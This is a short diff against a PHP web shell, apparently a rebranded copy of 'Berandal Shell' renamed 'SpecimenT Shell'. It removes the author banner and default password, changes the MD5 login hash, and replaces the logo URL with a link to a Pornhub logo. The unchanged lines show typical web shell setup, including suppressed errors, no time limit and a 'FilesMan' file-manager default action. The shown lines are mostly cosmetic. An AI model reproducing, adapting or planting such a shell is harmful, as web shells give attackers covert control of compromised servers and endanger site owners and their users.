@@ -1,11 +1,4 @@
 <?php
-/*-----------------------------------------------*/
-////////////////////////////////////////////////////////
-///         Berandal Shell V1.1 © 2017         ///
-///              Code by Berandal              ///
-///           Default pass: owlsquad           /// 
-///////////////////////////////////////////////////////
-/*-----------------------------------------------*/
 session_start();
 error_reporting(0);
 set_time_limit(0);
@@ -23,7 +16,7 @@ $_COOKIE = VEstripslashes($_COOKIE); }
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
  
-$auth_pass = "3d4ed96aa3e1b6ff28be94786db38395"; // default : sementgans
+$auth_pass = "647a8760285c45d737295b9926b3262f"; // default : sementgans
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
@@ -109,7 +102,7 @@ input[type=password] {
 </head>
 <center>
 <header>
-<img src='http://cyberscry.tech/images/logo.png' width='350' height='350'>
+<img src='https://upload.wikimedia.org/wikipedia/commons/thumb/f/f1/Pornhub-logo.svg/2000px-Pornhub-logo.svg.png' width='350' height='350'>
 <br>
 <pre onkeydown="return false;" onmousedown="return false;" class="kedip">
 <center><font color="white" face="ubuntu_monoregular" size="7">SpecimenT Shell V<font color="red">1.1</font></font></center>
